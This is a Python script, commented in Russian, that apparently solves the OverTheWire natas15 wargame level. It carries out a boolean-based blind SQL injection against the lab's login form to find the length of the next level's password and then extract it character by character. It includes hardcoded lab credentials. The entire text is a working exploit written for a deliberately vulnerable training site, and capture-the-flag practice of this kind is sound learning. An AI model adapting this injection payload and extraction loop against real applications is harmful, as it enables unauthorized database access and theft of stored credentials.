import requests
import string
import sys

URL = "http://natas15.natas.labs.overthewire.org/index.php"
AUTH = ("natas15", "GB6USCJYJjwLyYhZUNkE1NwDueiTow6g")
CHARSET = string.ascii_letters + string.digits

session = requests.Session()
session.auth = AUTH


def test(condition: str) -> bool:
    """Отправляет payload и проверяет, вернул ли сервер 'This user exists.'"""
    payload = (
        f'natas16" AND '
        f'(SELECT "a" FROM users WHERE username="natas16" AND {condition})="a'
    )
    r = session.post(URL, data={"username": payload}, timeout=10)
    return "This user exists" in r.text


# 1) Определяем длину пароля
length = None
for i in range(1, 65):
    if test(f"LENGTH(password)={i}"):
        length = i
        print(f"[+] Password length: {i}")
        break

if length is None:
    print("[-] Could not determine password length")
    sys.exit(1)

# 2) Перебираем символы
password = ""
for pos in range(1, length + 1):
    found = False
    for c in CHARSET:
        # BINARY нужен, чтобы MySQL не игнорировал регистр
        if test(f'SUBSTRING(password,{pos},1) = BINARY "{c}"'):
            password += c
            print(f"[+] pos {pos:2d}: {c}   => {password}")
            found = True
            break
    if not found:
        print(f"[-] No char found at position {pos}")
        break

print(f"\n[+] natas16 password: {password}")